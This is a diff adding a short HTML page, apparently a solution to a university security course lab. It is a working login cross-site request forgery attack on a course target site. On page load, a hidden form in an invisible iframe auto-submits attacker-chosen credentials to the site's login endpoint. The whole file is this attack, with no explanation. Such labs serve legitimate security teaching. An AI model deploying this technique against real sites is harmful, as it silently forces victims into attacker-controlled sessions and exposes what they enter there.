@@ -1,0 +1,19 @@
+<head>
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+</head>
+
+<iframe style="width: 0px; height: 0px; visibility: hidden" name="hidden"></iframe>
+<form action="http://eecs388.org/project2/login?csrfdefense=0&xssdefense=4" method="POST" name="csrf" target="hidden">
+<input type="hidden" name="username" value="attacker"/>
+<input type="hidden" name="password" value="l33th4x"/>
+</form>
+
+<script>
+
+$( window ).load(function() {
+ document.csrf.submit();
+
+});
+
+</script>
+
